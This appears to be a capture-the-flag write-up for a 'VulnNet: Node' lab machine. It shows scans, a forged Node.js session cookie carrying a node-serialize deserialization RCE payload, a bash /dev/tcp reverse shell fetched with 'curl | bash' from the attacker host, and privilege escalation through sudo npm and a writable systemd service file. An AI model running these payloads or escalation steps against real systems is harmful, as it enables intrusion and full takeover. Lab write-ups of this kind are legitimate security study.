@@ -1,0 +1,264 @@
+Vulnet:Node
+
+
+NMAP RESULTS:
+
+Nmap scan report for 10.10.90.108
+Host is up, received conn-refused (0.16s latency).
+Scanned at 2021-03-27 00:31:37 EDT for 49s
+
+PORT     STATE SERVICE REASON  VERSION
+8080/tcp open  http    syn-ack Node.js Express framework
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
+
+NSE: Script Post-scanning.
+
+
+GOBUSTER RESULTS:
+
+===============================================================
+2021/03/27 00:37:25 Starting gobuster
+===============================================================
+/img (Status: 301)
+/login (Status: 200)
+/css (Status: 301)
+/Login (Status: 200)
+/IMG (Status: 301)
+/CSS (Status: 301)
+/Img (Status: 301)
+/LogIn (Status: 200)
+/LOGIN (Status: 200)
+===============================================================
+2021/03/27 01:01:59 Finished
+===============================================================
+
+NOTHING INTERESTING.....
+BUT THEN ALSO I CHECK THE /css DIRECTORY AND FOUND THAT 
+
+Giving the GET request as /css, it got redirected to /css/
+lets intercept the request using burpsuite
+
+REQUEST
+===========================================
+GET /css HTTP/1.1
+Host: 10.10.90.108:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
+Upgrade-Insecure-Requests: 1
+==============================================
+
+My attention goes to the session cookie which is base64 encoded and after decoding it we get:
+{"username":"Guest","isGuest":true,"encoding": "utf-8"}
+
+SO CAN WE FORGE THE COOKIE AND GET THE ADMIN RIGHTS?
+WE ALSO GOT A /login PAGE ASKING FOR CREDENTIALS
+
+when i change the 'username' field to 'admin'
+it get also reflected to the webpage as: 'Welcome admin'
+
+i search on google about node.js cookie deserialization exploit and got some medium blogs
+i also searchsploit this exploit and got the deserialized payload:
+==========================================================================================================
+var serialize = require('node-serialize');
+var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
+serialize.unserialize(payload);
+================================================================================================================
+
+which on serializing using the node interface, then this serialized funtion get pass through the JSON object and then as a argument of the eval() funtion (that is present in the source code) and got executed
+
+using the exploit find on searchsploit, made some changes (removing the function() object and the escaping characters):
+
+{"username":"_$$ND_FUNC$$_require('child_process').exec('ping -c2 10.8.73.218', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}
+
+
+THEN BASE64 THIS PAYLOAD
+=======================================================================================================================================
+
+then i send this request using the burpsuit repeater:
+========================================================================================================================================
+GET / HTTP/1.1
+Host: 10.10.49.3:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygncGluZyAtYzIgIDEwLjguNzMuMjE4JywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSkiLCJpc0d1ZXN0Ijp0cnVlLCJlbmNvZGluZyI6ICJ1dGYtOCJ9
+Upgrade-Insecure-Requests: 1
+If-None-Match: W/"1daf-dPXia8DLlOwYnTXebWSDo/Cj9Co"
+Cache-Control: max-age=0
+==========================================================================================================================================
+
+┌──(kali㉿kali)-[~/vuln]
+└─$ sudo tcpdump -i tun0 icmp                                                                               
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+05:30:48.439870 IP 10.10.49.3 > 10.8.73.218: ICMP echo request, id 1002, seq 1, length 64
+05:30:48.439922 IP 10.8.73.218 > 10.10.49.3: ICMP echo reply, id 1002, seq 1, length 64
+05:30:49.441518 IP 10.10.49.3 > 10.8.73.218: ICMP echo request, id 1002, seq 2, length 64
+05:30:49.441535 IP 10.8.73.218 > 10.10.49.3: ICMP echo reply, id 1002, seq 2, length 64
+^C
+4 packets captured
+4 packets received by filter
+0 packets dropped by kernel
+
+WE GOT OUR PING BACK , NOW ITS TIME FOR A REVERSE SHELL
+WE CAN'T JUST PUT THE BASH COMMAND AND GET A REVERSE SHELL BECAUSE IT CONTAIN SOME CHARACTERS WHICH MIGHT BE CONSIDER AS BAD
+
+SO WE CAN MAKE A BASH SCRIPT NAMED shell.sh AND PUT OUR REVERSE SHELL CODE IN IT:
+
+========================================================================================
+┌──(kali㉿kali)-[~/vuln]
+└─$ cat shell.sh 
+#!/bin/bash
+
+bash -c 'bash -i >& /dev/tcp/10.8.73.218/1234 0>&1'
+                                                                                                                                                                        
+┌──(kali㉿kali)-[~/vuln]
+========================================================================================
+
+NOW START A PYTHON WEBSERVER AND USE 'curl' or 'wget' TO UPLOAD THE SHELL TO THE REMOTE MACHINE:
+
+PAYLOAD:
+{"username":"_$$ND_FUNC$$_require('child_process').exec('curl 10.8.73.218/shell.sh | bash', function(error, stdout, stderr) { console.log(stdout) })","isGuest":true,"encoding": "utf-8"}
+
+WEBSERVER LOGS:
+┌──(kali㉿kali)-[~/vuln]
+└─$ sudo python3 -m http.server 80                                                                       
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.49.3 - - [27/Mar/2021 05:40:26] "GET /shell.sh HTTP/1.1" 200 -
+
+THIS MEANS THAT OUR FILE IS SUCCESSFULLY UPLOADED
+NOW TURN ON A LISTENER AND GET A REVERSE SHELL BY EXECUTING THE SCRIPT ON THE SERVER
+
+┌──(kali㉿kali)-[~/vuln]
+└─$ nc -nvlp 1234 
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.49.3] 47310
+bash: cannot set terminal process group (618): Inappropriate ioctl for device
+bash: no job control in this shell
+www@vulnnet-node:~/VulnNet-Node$ 
+
+YES WE ARE IN!!!
+
+www@vulnnet-node:~$ sudo -l
+Matching Defaults entries for www on vulnnet-node:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www may run the following commands on vulnnet-node:
+    (serv-manage) NOPASSWD: /usr/bin/npm
+
+
+    LETS CHECK GTFOBINS
+
+
+    TF=$(mktemp -d)
+    echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
+    sudo npm -C $TF --unsafe-perm i
+
+LETS TRY THESE COMMANDS
+
+vulnnet-node:/dev/shm$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
+www@vulnnet-node:/dev/shm$ sudo -u serv-manage /usr/bin/npm -C . --unsafe-perm i
+
+> @ preinstall /dev/shm
+> /bin/sh
+
+$ id
+uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
+$ 
+
+IM serv-manage now
+GOT THE USER FLAG
+
+
+serv-manage@vulnnet-node:~$ sudo -l
+Matching Defaults entries for serv-manage on vulnnet-node:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User serv-manage may run the following commands on vulnnet-node:
+    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
+    (root) NOPASSWD: /bin/systemctl daemon-reload
+
+
+serv-manage@vulnnet-node:/dev/shm$ locate vulnnet-auto.timer
+/etc/systemd/system/vulnnet-auto.timer
+-rw-rw-r-- 1 root serv-manage 167 Jan 24 16:59 /etc/systemd/system/vulnnet-auto.timer
+serv-manage@vulnnet-node:/dev/shm$ 
+
+
+WE CAN SEE THAT WE CAN MODIFY THIS FILE
+
+serv-manage@vulnnet-node:/dev/shm$ 
+
+WE CAN SEE THE 'unit' PARAMTER WHICH IS THE SERVICE THAT WILL RUN
+
+serv-manage@vulnnet-node:/dev/shm$ locate vulnnet-job.service
+/etc/systemd/system/vulnnet-job.service
+serv-manage@vulnnet-node:/dev/shm$ ls -la /etc/systemd/system/vulnnet-job.service
+-rw-rw-r-- 1 root serv-manage 197 Jan 24 21:40 /etc/systemd/system/vulnnet-job.service
+
+THIS FILE IS ALSO WRITABLE
+[Unit]
+Description=Logs system statistics to the systemd journal
+Wants=vulnnet-auto.timer
+
+[Service]
+# Gather system statistics
+Type=forking
+ExecStart=/bin/df
+
+[Install]
+WantedBy=multi-user.target
+
+THIS "ExecStart" Parameter can be exploited
+
+
+
+LETS CHECK GTFOBINS
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+sudo systemctl link $TF
+sudo systemctl enable --now $TF
+
+LETS ADD THESE COMMAND INTO THIS FILE:
+==============================================================================================
+[Unit]
+Description=Logs system statistics to the systemd journal
+Wants=vulnnet-auto.timer
+
+[Service]
+# Gather system statistics
+Type=forking
+ExecStart=/bin/bash -c "curl 10.8.73.218/shell.sh | bash"
+
+[Install]
+WantedBy=multi-user.target
+==============================================================================================
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444                                                              1 ⨯
+listening on [any] 4444 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.226.193] 60840
+bash: cannot set terminal process group (1186): Inappropriate ioctl for device
+bash: no job control in this shell
+root@vulnnet-node:/# 
+
+WE ARE ROOT!!
+GOT THE ROOT FLAG
